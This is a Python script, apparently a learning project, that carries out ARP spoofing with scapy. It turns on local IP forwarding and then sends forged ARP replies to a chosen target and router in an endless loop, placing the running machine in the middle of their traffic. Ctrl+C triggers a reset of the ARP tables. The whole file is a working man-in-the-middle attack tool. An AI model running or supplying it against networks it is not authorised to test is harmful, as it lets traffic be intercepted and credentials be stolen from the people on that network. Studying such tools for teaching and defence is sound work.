#!/usr/bin/env python3

from time import sleep
import scapy.all as scapy
import subprocess
import argparse

from scapy.packet import Packet

# TODO implement verbose functionality
# TODO separate out fetching mac from spoof()
# TODO add support for hostnames/FQDNs instead of IPs

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", help="Increase output verbosity", action="store_true")
    parser.add_argument("-r", "--router", type=str, help="Router IP")
    parser.add_argument("-t", "--target", type=str, help="Target IP")
    args = parser.parse_args()
    if args.verbose:
        print("[+] verbosity turned on")
        print(args.target, args.router)
    if not args.router:
        parser.error("[-] Please specify a router IP or use --help for more info.")
    if not args.target:
        parser.error("[-] Please specify a target IP or use --help for more info.")
    return args

def get_mac(host):
    # print("[i] Entering get_mac function host is: ", host)
    arp_request = scapy.ARP(pdst=host)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    targets_found = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # if target_found empty handle error eg if target not up
    target_mac_address = targets_found[0][1].hwsrc
    if args.verbose:
        print("[+] Target MAC: " + target_mac_address)
    return(target_mac_address)

def spoof(target, spoof):
    ''' TODO '''
    target_mac = get_mac(target) # TODO - this is inefficient to keep fetching the mac here. Prefetch outside the spoof function in a dict target.ip, target.mac 
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
    if args.verbose:
        print(packet.show())
        print(packet.summary())
    scapy.send(packet, verbose=args.verbose)

def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    if args.verbose:
        print(packet.show())
        print(packet.summary())
    scapy.send(packet, count=4, verbose=args.verbose)
    print("\n[+] ARP Tables reset correctly")

args = get_arguments()
# print(args)
# print(args.target, args.router)

# TODO create function storing state of ip_forwarding for restoration
# read /proc/sys/net/ipv4/ip_forward at start and store
# on restore 
#   1) restore both MACS
#   2) restore ip_forward to state prior to execution


subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]) # Setup routing/forwarding locally

sent_packet_count = 0
try:
    while True:
        spoof(args.target, args.router)
        sent_packet_count = sent_packet_count + 1
        print("\r[+] arp_spoof packet: " + str(sent_packet_count) + " to " + args.target + " (target) ", end="")
        spoof(args.router, args.target)
        sent_packet_count = sent_packet_count + 1
        print(" packet: " + str(sent_packet_count) + " to " + args.router + " (router)", end="")
        sleep(1)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL +C .... Resetting ARP tables.", end="")
    restore_arp(args.target, args.router)